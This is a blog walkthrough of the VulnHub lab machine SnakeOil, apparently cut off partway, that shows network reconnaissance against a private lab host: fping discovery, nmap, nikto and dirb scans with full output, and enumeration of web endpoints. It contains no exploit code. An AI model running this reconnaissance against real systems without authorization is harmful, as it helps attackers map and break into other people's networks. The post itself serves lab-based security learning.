<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="../../../index.css"/>
<link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
<script src="../../../highlight/highlight.min.js"></script>
<script>hljs.highlightAll();</script>

<h1>/f0c1s/blog/sec/vulnhub/digitalworld.local:SnakeOil</h1>

<p>
  <a href="../../../index.html">/blog</a>
  <a href="../../index.html">Security</a>
  <a href="../index.html">VulnHub</a>
  <a href="../../../sec/vulnhub/digitalworld.local-SnakeOil/snakeoil.html">+ digitalworld.local:SnakeOil - 2021.12.20 Monday</a>
</p>

<h1 id="digitalworld.local-snakeoil">digitalworld.local SnakeOil</h1>
<h2 id="description-on-vulnhub">Description on VulnHub</h2>
<pre><code>Recently, Good Tech Inc. has decided to change their application development process. However, their applications look broken and too basic. Is this an application full of snakeoil, or are they insecure too? This goes beyond PEN-200, and some web application development expertise could be helpful.

If you MUST have hints for this machine: SNAKEOIL is (#1): a hint by itself, (#2): full of disallowed methods, (#3): a single file full of problems.</code></pre>
<p><a href="http://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/#download">VulnHub</a> <a href="http://www.vulnhub.com/series/digitalworldlocal,182/">Series: digitalworld.local</a></p>
<figure>
<img src="0.running-virtualbox.png" alt="" /><figcaption>0.running-virtualbox</figcaption>
</figure>
<h2 id="scanning">Scanning</h2>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 11:20:17 AM IST 2021.12.20 11:20:17
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
fping -aAqg 192.168.56.1/24 | tee fping.txt
192.168.56.1
192.168.56.2
192.168.56.70
192.168.56.75
                                                                                                                                                                                                                                           


hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 11:20:30 AM IST 2021.12.20 11:20:30
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
export RHOST=&quot;192.168.56.75&quot; 
export LHOST=&quot;192.168.56.70&quot;
export LPORT=&quot;443&quot;
                                                                                                                   


hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 11:20:36 AM IST 2021.12.20 11:20:36
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
_ntd $RHOST
firing nmap 192.168.56.75 -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-20 11:20 IST
Nmap scan report for 192.168.56.75
Host is up (0.00024s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 73:a4:8f:94:a2:20:68:50:5a:ae:e1:d3:60:8d:ff:55 (RSA)
|   256 f3:1b:d8:c3:0c:3f:5e:6b:ac:99:52:80:7b:d6:b6:e7 (ECDSA)
|_  256 ea:61:64:b6:3b:d3:84:01:50:d8:1a:ab:38:29:12:e1 (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-title: Welcome to SNAKEOIL!
|_http-server-header: nginx/1.14.2
8080/tcp open  http    nginx 1.14.2
|_http-title:  Welcome to Good Tech Inc.&#39;s Snake Oil Project 
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.56 seconds
                                                                                                                   


hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 11:20:48 AM IST 2021.12.20 11:20:48
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
_n $RHOST  
firing nmap 192.168.56.75 | tee nmap.default.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-20 11:20 IST
Nmap scan report for 192.168.56.75
Host is up (0.00064s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds


hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 11:20:56 AM IST 2021.12.20 11:20:56
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
nmap $RHOST -n -p22,80,8080 -Pn -T4 --min-rate=5000 -sVC --script=*enum* | tee nmap.enum.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-20 11:21 IST
Nmap scan report for 192.168.56.75
Host is up (0.00034s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh2-enum-algos: 
|   kex_algorithms: (10)
|       curve25519-sha256
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group16-sha512
|       diffie-hellman-group18-sha512
|       diffie-hellman-group14-sha256
|       diffie-hellman-group14-sha1
|   server_host_key_algorithms: (5)
|       rsa-sha2-512
|       rsa-sha2-256
|       ssh-rsa
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
8080/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.43 seconds
</code></pre>
<figure>
<img src="1.fping.png" alt="" /><figcaption>1.fping</figcaption>
</figure>
<figure>
<img src="2.nmap-tcp-ports-and-default.png" alt="" /><figcaption>2.nmap-tcp-ports-and-default</figcaption>
</figure>
<figure>
<img src="3.nmap-enum.png" alt="" /><figcaption>3.nmap-enum</figcaption>
</figure>
<h2 id="attacking-web-port-80">Attacking Web Port 80</h2>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 11:21:18 AM IST 2021.12.20 11:21:18
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
nikto -C all -host http://$RHOST | tee nikto.txt                                            
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.75
+ Target Hostname:    192.168.56.75
+ Target Port:        80
+ Start Time:         2021-12-20 11:24:30 (GMT5.5)
---------------------------------------------------------------------------
+ Server: nginx/1.14.2
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ 26522 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2021-12-20 11:25:07 (GMT5.5) (37 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
                                                                                                                   


hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 11:25:07 AM IST 2021.12.20 11:25:07
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
dirb http://$RHOST       

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Dec 20 11:26:30 2021
URL_BASE: http://192.168.56.75/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.75/ ----
                                                                                                                  
-----------------
END_TIME: Mon Dec 20 11:26:31 2021
DOWNLOADED: 4612 - FOUND: 0
</code></pre>
<figure>
<img src="4.nikto-dirb-port-80.png" alt="" /><figcaption>4.nikto-dirb-port-80</figcaption>
</figure>
<h3 id="http192.168.56.75"><code>http://192.168.56.75/</code></h3>
<figure>
<img src="5.web-at-port-80.png" alt="" /><figcaption>5.web-at-port-80</figcaption>
</figure>
<div class="sourceCode" id="cb4"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="dt">&lt;!DOCTYPE </span>html<span class="dt">&gt;</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true"></a><span class="kw">&lt;html&gt;</span></span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true"></a><span class="kw">&lt;head&gt;</span></span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true"></a><span class="kw">&lt;title&gt;</span>Welcome to SNAKEOIL!<span class="kw">&lt;/title&gt;</span></span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true"></a><span class="kw">&lt;style&gt;</span></span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true"></a>    body {</span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true"></a>        <span class="kw">width</span>: <span class="dv">35</span><span class="dt">em</span><span class="op">;</span></span>
<span id="cb4-8"><a href="#cb4-8" aria-hidden="true"></a>        <span class="kw">margin</span>: <span class="dv">0</span> <span class="bu">auto</span><span class="op">;</span></span>
<span id="cb4-9"><a href="#cb4-9" aria-hidden="true"></a>        <span class="kw">font-family</span>: Tahoma<span class="op">,</span> Verdana<span class="op">,</span> Arial<span class="op">,</span> <span class="dv">sans-serif</span><span class="op">;</span></span>
<span id="cb4-10"><a href="#cb4-10" aria-hidden="true"></a>    }</span>
<span id="cb4-11"><a href="#cb4-11" aria-hidden="true"></a><span class="kw">&lt;/style&gt;</span></span>
<span id="cb4-12"><a href="#cb4-12" aria-hidden="true"></a><span class="kw">&lt;/head&gt;</span></span>
<span id="cb4-13"><a href="#cb4-13" aria-hidden="true"></a><span class="kw">&lt;body&gt;</span></span>
<span id="cb4-14"><a href="#cb4-14" aria-hidden="true"></a><span class="kw">&lt;h1&gt;</span>Welcome to SNAKEOIL!<span class="kw">&lt;/h1&gt;</span></span>
<span id="cb4-15"><a href="#cb4-15" aria-hidden="true"></a><span class="kw">&lt;p&gt;</span>Congratulations! SNAKEOIL is set up properly!<span class="kw">&lt;/p&gt;</span></span>
<span id="cb4-16"><a href="#cb4-16" aria-hidden="true"></a></span>
<span id="cb4-17"><a href="#cb4-17" aria-hidden="true"></a><span class="kw">&lt;p&gt;</span>If you are lost with life, <span class="kw">&lt;a</span><span class="ot"> href=</span><span class="st">&quot;https://www.google.com&quot;</span><span class="kw">&gt;</span>Google<span class="kw">&lt;/a&gt;</span> can help.<span class="kw">&lt;br/&gt;&lt;/p&gt;</span></span>
<span id="cb4-18"><a href="#cb4-18" aria-hidden="true"></a></span>
<span id="cb4-19"><a href="#cb4-19" aria-hidden="true"></a><span class="kw">&lt;/body&gt;</span></span>
<span id="cb4-20"><a href="#cb4-20" aria-hidden="true"></a><span class="kw">&lt;/html&gt;</span></span></code></pre></div>
<p>There is almost nothing here.</p>
<h2 id="attacking-web-at-port-8080">Attacking web at port 8080</h2>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 11:23:01 AM IST 2021.12.20 11:23:01
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
nikto -C all -host http://$RHOST:8080 | tee nikto.txt                                     
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.75
+ Target Hostname:    192.168.56.75
+ Target Port:        8080
+ Start Time:         2021-12-20 11:24:39 (GMT5.5)
---------------------------------------------------------------------------
+ Server: nginx/1.14.2
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Allowed HTTP Methods: OPTIONS, GET, HEAD 
+ 26524 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2021-12-20 11:25:51 (GMT5.5) (72 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
                                                                                                                   


hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 11:25:51 AM IST 2021.12.20 11:25:51
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
dirb http://$RHOST:8080 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Dec 20 11:26:38 2021
URL_BASE: http://192.168.56.75:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.75:8080/ ----
+ http://192.168.56.75:8080/01 (CODE:200|SIZE:2193)                                                               
+ http://192.168.56.75:8080/02 (CODE:200|SIZE:2356)                                                               
+ http://192.168.56.75:8080/04 (CODE:200|SIZE:2324)                                                               
+ http://192.168.56.75:8080/1 (CODE:200|SIZE:2193)                                                                
+ http://192.168.56.75:8080/2 (CODE:200|SIZE:2356)                                                                
+ http://192.168.56.75:8080/4 (CODE:200|SIZE:2324)                                                                
+ http://192.168.56.75:8080/create (CODE:200|SIZE:2596)                                                           
+ http://192.168.56.75:8080/login (CODE:405|SIZE:64)                                                              
+ http://192.168.56.75:8080/registration (CODE:200|SIZE:29)                                                       
+ http://192.168.56.75:8080/run (CODE:405|SIZE:178)                                                               
+ http://192.168.56.75:8080/secret (CODE:500|SIZE:37)                                                             
+ http://192.168.56.75:8080/test (CODE:200|SIZE:17)                                                               
+ http://192.168.56.75:8080/users (CODE:200|SIZE:140)                                                             
                                                                                                                  
-----------------
END_TIME: Mon Dec 20 11:26:43 2021
DOWNLOADED: 4612 - FOUND: 13
</code></pre>
<figure>
<img src="6.nikto-dirb-port-8080.png" alt="" /><figcaption>6.nikto-dirb-port-8080</figcaption>
</figure>
<h3 id="http192.168.56.758080"><code>http://192.168.56.75:8080/</code></h3>
<figure>
<img src="7.web-at-port-8080.png" alt="" /><figcaption>7.web-at-port-8080</figcaption>
</figure>
<div class="sourceCode" id="cb6"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="dt">&lt;!doctype </span>html<span class="dt">&gt;</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a><span class="kw">&lt;html</span><span class="ot"> lang=</span><span class="st">&quot;en&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a>  <span class="kw">&lt;head&gt;</span></span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a>    <span class="co">&lt;!-- Required meta tags --&gt;</span></span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true"></a>    <span class="kw">&lt;meta</span><span class="ot"> charset=</span><span class="st">&quot;utf-8&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true"></a>    <span class="kw">&lt;meta</span><span class="ot"> name=</span><span class="st">&quot;viewport&quot;</span><span class="ot"> content=</span><span class="st">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true"></a></span>
<span id="cb6-8"><a href="#cb6-8" aria-hidden="true"></a>    <span class="co">&lt;!-- Bootstrap CSS --&gt;</span></span>
<span id="cb6-9"><a href="#cb6-9" aria-hidden="true"></a>    <span class="kw">&lt;link</span><span class="ot"> rel=</span><span class="st">&quot;stylesheet&quot;</span><span class="ot"> href=</span><span class="st">&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css&quot;</span><span class="ot"> integrity=</span><span class="st">&quot;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T&quot;</span><span class="ot"> crossorigin=</span><span class="st">&quot;anonymous&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-10"><a href="#cb6-10" aria-hidden="true"></a></span>
<span id="cb6-11"><a href="#cb6-11" aria-hidden="true"></a>    <span class="kw">&lt;title&gt;</span> Welcome to Good Tech Inc.&#39;s Snake Oil Project <span class="kw">&lt;/title&gt;</span></span>
<span id="cb6-12"><a href="#cb6-12" aria-hidden="true"></a>  <span class="kw">&lt;/head&gt;</span></span>
<span id="cb6-13"><a href="#cb6-13" aria-hidden="true"></a>  <span class="kw">&lt;body&gt;</span></span>
<span id="cb6-14"><a href="#cb6-14" aria-hidden="true"></a>    <span class="kw">&lt;nav</span><span class="ot"> class=</span><span class="st">&quot;navbar navbar-expand-md navbar-light bg-light&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-15"><a href="#cb6-15" aria-hidden="true"></a>        <span class="kw">&lt;a</span><span class="ot"> class=</span><span class="st">&quot;navbar-brand&quot;</span><span class="ot"> href=</span><span class="st">&quot;/&quot;</span><span class="kw">&gt;</span>Good Tech Inc<span class="kw">&lt;/a&gt;</span></span>
<span id="cb6-16"><a href="#cb6-16" aria-hidden="true"></a>        <span class="kw">&lt;button</span><span class="ot"> class=</span><span class="st">&quot;navbar-toggler&quot;</span><span class="ot"> type=</span><span class="st">&quot;button&quot;</span><span class="ot"> data-toggle=</span><span class="st">&quot;collapse&quot;</span><span class="ot"> data-target=</span><span class="st">&quot;#navbarNav&quot;</span><span class="ot"> aria-controls=</span><span class="st">&quot;navbarNav&quot;</span><span class="ot"> aria-expanded=</span><span class="st">&quot;false&quot;</span><span class="ot"> aria-label=</span><span class="st">&quot;Toggle navigation&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-17"><a href="#cb6-17" aria-hidden="true"></a>            <span class="kw">&lt;span</span><span class="ot"> class=</span><span class="st">&quot;navbar-toggler-icon&quot;</span><span class="kw">&gt;&lt;/span&gt;</span></span>
<span id="cb6-18"><a href="#cb6-18" aria-hidden="true"></a>        <span class="kw">&lt;/button&gt;</span></span>
<span id="cb6-19"><a href="#cb6-19" aria-hidden="true"></a>        <span class="kw">&lt;div</span><span class="ot"> class=</span><span class="st">&quot;collapse navbar-collapse&quot;</span><span class="ot"> id=</span><span class="st">&quot;navbarNav&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-20"><a href="#cb6-20" aria-hidden="true"></a>            <span class="kw">&lt;ul</span><span class="ot"> class=</span><span class="st">&quot;navbar-nav&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-21"><a href="#cb6-21" aria-hidden="true"></a>            <span class="kw">&lt;li</span><span class="ot"> class=</span><span class="st">&quot;nav-item active&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-22"><a href="#cb6-22" aria-hidden="true"></a>                <span class="kw">&lt;a</span><span class="ot"> class=</span><span class="st">&quot;nav-link&quot;</span><span class="ot"> href=</span><span class="st">&quot;#&quot;</span><span class="kw">&gt;</span>About<span class="kw">&lt;/a&gt;</span></span>
<span id="cb6-23"><a href="#cb6-23" aria-hidden="true"></a>            <span class="kw">&lt;/li&gt;</span></span>
<span id="cb6-24"><a href="#cb6-24" aria-hidden="true"></a>            <span class="kw">&lt;li</span><span class="ot"> class=</span><span class="st">&quot;nav-item&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-25"><a href="#cb6-25" aria-hidden="true"></a>                <span class="kw">&lt;a</span><span class="ot"> class=</span><span class="st">&quot;nav-link&quot;</span><span class="ot"> href=</span><span class="st">&quot;/create&quot;</span><span class="kw">&gt;</span>New Post<span class="kw">&lt;/a&gt;</span></span>
<span id="cb6-26"><a href="#cb6-26" aria-hidden="true"></a>            <span class="kw">&lt;/li&gt;</span></span>
<span id="cb6-27"><a href="#cb6-27" aria-hidden="true"></a>            <span class="kw">&lt;/ul&gt;</span></span>
<span id="cb6-28"><a href="#cb6-28" aria-hidden="true"></a>        <span class="kw">&lt;/div&gt;</span></span>
<span id="cb6-29"><a href="#cb6-29" aria-hidden="true"></a>    <span class="kw">&lt;/nav&gt;</span></span>
<span id="cb6-30"><a href="#cb6-30" aria-hidden="true"></a>    <span class="kw">&lt;div</span><span class="ot"> class=</span><span class="st">&quot;container&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-31"><a href="#cb6-31" aria-hidden="true"></a>        </span>
<span id="cb6-32"><a href="#cb6-32" aria-hidden="true"></a>        </span>
<span id="cb6-33"><a href="#cb6-33" aria-hidden="true"></a>    <span class="kw">&lt;h1&gt;</span> Welcome to Good Tech Inc.&#39;s Snake Oil Project <span class="kw">&lt;/h1&gt;</span></span>
<span id="cb6-34"><a href="#cb6-34" aria-hidden="true"></a>    </span>
<span id="cb6-35"><a href="#cb6-35" aria-hidden="true"></a>        <span class="kw">&lt;a</span><span class="ot"> href=</span><span class="st">&quot;/1&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-36"><a href="#cb6-36" aria-hidden="true"></a>            <span class="kw">&lt;h2&gt;</span>Introduction<span class="kw">&lt;/h2&gt;</span></span>
<span id="cb6-37"><a href="#cb6-37" aria-hidden="true"></a>        <span class="kw">&lt;/a&gt;</span></span>
<span id="cb6-38"><a href="#cb6-38" aria-hidden="true"></a>            <span class="kw">&lt;span</span><span class="ot"> class=</span><span class="st">&quot;badge badge-primary&quot;</span><span class="kw">&gt;</span>2021-06-19 10:02:53<span class="kw">&lt;/span&gt;</span></span>
<span id="cb6-39"><a href="#cb6-39" aria-hidden="true"></a>        <span class="kw">&lt;a</span><span class="ot"> href=</span><span class="st">&quot;/1/edit&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-40"><a href="#cb6-40" aria-hidden="true"></a>            <span class="kw">&lt;span</span><span class="ot"> class=</span><span class="st">&quot;badge badge-warning&quot;</span><span class="kw">&gt;</span>Edit<span class="kw">&lt;/span&gt;</span></span>
<span id="cb6-41"><a href="#cb6-41" aria-hidden="true"></a>        <span class="kw">&lt;/a&gt;</span></span>
<span id="cb6-42"><a href="#cb6-42" aria-hidden="true"></a>        <span class="kw">&lt;hr&gt;</span></span>
<span id="cb6-43"><a href="#cb6-43" aria-hidden="true"></a>    </span>
<span id="cb6-44"><a href="#cb6-44" aria-hidden="true"></a>        <span class="kw">&lt;a</span><span class="ot"> href=</span><span class="st">&quot;/2&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-45"><a href="#cb6-45" aria-hidden="true"></a>            <span class="kw">&lt;h2&gt;</span>House Rules<span class="kw">&lt;/h2&gt;</span></span>
<span id="cb6-46"><a href="#cb6-46" aria-hidden="true"></a>        <span class="kw">&lt;/a&gt;</span></span>
<span id="cb6-47"><a href="#cb6-47" aria-hidden="true"></a>            <span class="kw">&lt;span</span><span class="ot"> class=</span><span class="st">&quot;badge badge-primary&quot;</span><span class="kw">&gt;</span>2021-06-19 10:02:53<span class="kw">&lt;/span&gt;</span></span>
<span id="cb6-48"><a href="#cb6-48" aria-hidden="true"></a>        <span class="kw">&lt;a</span><span class="ot"> href=</span><span class="st">&quot;/2/edit&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-49"><a href="#cb6-49" aria-hidden="true"></a>            <span class="kw">&lt;span</span><span class="ot"> class=</span><span class="st">&quot;badge badge-warning&quot;</span><span class="kw">&gt;</span>Edit<span class="kw">&lt;/span&gt;</span></span>
<span id="cb6-50"><a href="#cb6-50" aria-hidden="true"></a>        <span class="kw">&lt;/a&gt;</span></span>
<span id="cb6-51"><a href="#cb6-51" aria-hidden="true"></a>        <span class="kw">&lt;hr&gt;</span></span>
<span id="cb6-52"><a href="#cb6-52" aria-hidden="true"></a>    </span>
<span id="cb6-53"><a href="#cb6-53" aria-hidden="true"></a>        <span class="kw">&lt;a</span><span class="ot"> href=</span><span class="st">&quot;/4&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-54"><a href="#cb6-54" aria-hidden="true"></a>            <span class="kw">&lt;h2&gt;</span>Useful Links<span class="kw">&lt;/h2&gt;</span></span>
<span id="cb6-55"><a href="#cb6-55" aria-hidden="true"></a>        <span class="kw">&lt;/a&gt;</span></span>
<span id="cb6-56"><a href="#cb6-56" aria-hidden="true"></a>            <span class="kw">&lt;span</span><span class="ot"> class=</span><span class="st">&quot;badge badge-primary&quot;</span><span class="kw">&gt;</span>2021-08-18 00:29:46<span class="kw">&lt;/span&gt;</span></span>
<span id="cb6-57"><a href="#cb6-57" aria-hidden="true"></a>        <span class="kw">&lt;a</span><span class="ot"> href=</span><span class="st">&quot;/4/edit&quot;</span><span class="kw">&gt;</span></span>
<span id="cb6-58"><a href="#cb6-58" aria-hidden="true"></a>            <span class="kw">&lt;span</span><span class="ot"> class=</span><span class="st">&quot;badge badge-warning&quot;</span><span class="kw">&gt;</span>Edit<span class="kw">&lt;/span&gt;</span></span>
<span id="cb6-59"><a href="#cb6-59" aria-hidden="true"></a>        <span class="kw">&lt;/a&gt;</span></span>
<span id="cb6-60"><a href="#cb6-60" aria-hidden="true"></a>        <span class="kw">&lt;hr&gt;</span></span>
<span id="cb6-61"><a href="#cb6-61" aria-hidden="true"></a>    </span>
<span id="cb6-62"><a href="#cb6-62" aria-hidden="true"></a></span>
<span id="cb6-63"><a href="#cb6-63" aria-hidden="true"></a>    <span class="kw">&lt;/div&gt;</span></span>
<span id="cb6-64"><a href="#cb6-64" aria-hidden="true"></a></span>
<span id="cb6-65"><a href="#cb6-65" aria-hidden="true"></a>    <span class="co">&lt;!-- Optional JavaScript --&gt;</span></span>
<span id="cb6-66"><a href="#cb6-66" aria-hidden="true"></a>    <span class="co">&lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt;</span></span>
<span id="cb6-67"><a href="#cb6-67" aria-hidden="true"></a>    <span class="kw">&lt;script</span><span class="ot"> src=</span><span class="st">&quot;https://code.jquery.com/jquery-3.3.1.slim.min.js&quot;</span><span class="ot"> integrity=</span><span class="st">&quot;sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo&quot;</span><span class="ot"> crossorigin=</span><span class="st">&quot;anonymous&quot;</span><span class="kw">&gt;&lt;/script&gt;</span></span>
<span id="cb6-68"><a href="#cb6-68" aria-hidden="true"></a>    <span class="kw">&lt;script</span><span class="ot"> src=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js&quot;</span><span class="ot"> integrity=</span><span class="st">&quot;sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1&quot;</span><span class="ot"> crossorigin=</span><span class="st">&quot;anonymous&quot;</span><span class="kw">&gt;&lt;/script&gt;</span></span>
<span id="cb6-69"><a href="#cb6-69" aria-hidden="true"></a>    <span class="kw">&lt;script</span><span class="ot"> src=</span><span class="st">&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&quot;</span><span class="ot"> integrity=</span><span class="st">&quot;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM&quot;</span><span class="ot"> crossorigin=</span><span class="st">&quot;anonymous&quot;</span><span class="kw">&gt;&lt;/script&gt;</span></span>
<span id="cb6-70"><a href="#cb6-70" aria-hidden="true"></a>  <span class="kw">&lt;/body&gt;</span></span>
<span id="cb6-71"><a href="#cb6-71" aria-hidden="true"></a><span class="kw">&lt;/html&gt;</span></span></code></pre></div>
<h3 id="http192.168.56.7580804"><code>http://192.168.56.75:8080/4</code></h3>
<figure>
<img src="8.post-number-eight.png" alt="" /><figcaption>8.post-number-eight</figcaption>
</figure>
<p><a href="https://flask-jwt-extended.readthedocs.io/en/stable/options/">Link mentioned about JWT: https://flask-jwt-extended.readthedocs.io/en/stable/options/</a></p>
<h3 id="three-is-missing">Three is missing</h3>
<p>If you look at the source code above, the post numbered 3 is missing.</p>
<figure>
<img src="9.missing-post-number-three-in-code.png" alt="" /><figcaption>9.missing-post-number-three-in-code</figcaption>
</figure>
<figure>
<img src="10.here-is-the-missing-post.png" alt="" /><figcaption>10.here-is-the-missing-post</figcaption>
</figure>
<figure>
<img src="11.missing-post-numbers-get-same-error-message.png" alt="" /><figcaption>11.missing-post-numbers-get-same-error-message</figcaption>
</figure>
<h3 id="rest-of-the-pages">Rest of the pages</h3>
<h4 id="create">/create</h4>
<figure>
<img src="12.create.png" alt="" /><figcaption>12.create</figcaption>
</figure>
<h4 id="login">/login</h4>
<figure>
<img src="13.login.png" alt="" /><figcaption>13.login</figcaption>
</figure>
<h4 id="registration">/registration</h4>
<figure>
<img src="14.registration.png" alt="" /><figcaption>14.registration</figcaption>
</figure>
<h4 id="run">/run</h4>
<figure>
<img src="15.run-method-not-allowed.png" alt="" /><figcaption>15.run-method-not-allowed</figcaption>
</figure>
<h4 id="secret">/secret</h4>
<figure>
<img src="16.secret.png" alt="" /><figcaption>16.secret</figcaption>
</figure>
<h4 id="test">/test</h4>
<figure>
<img src="17.test.png" alt="" /><figcaption>17.test</figcaption>
</figure>
<h4 id="users">/users</h4>
<figure>
<img src="18.users.png" alt="" /><figcaption>18.users</figcaption>
</figure>
<div class="sourceCode" id="cb7"><pre class="sourceCode json"><code class="sourceCode json"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="fu">{</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a>  <span class="dt">&quot;users&quot;</span><span class="fu">:</span> <span class="ot">[</span></span>
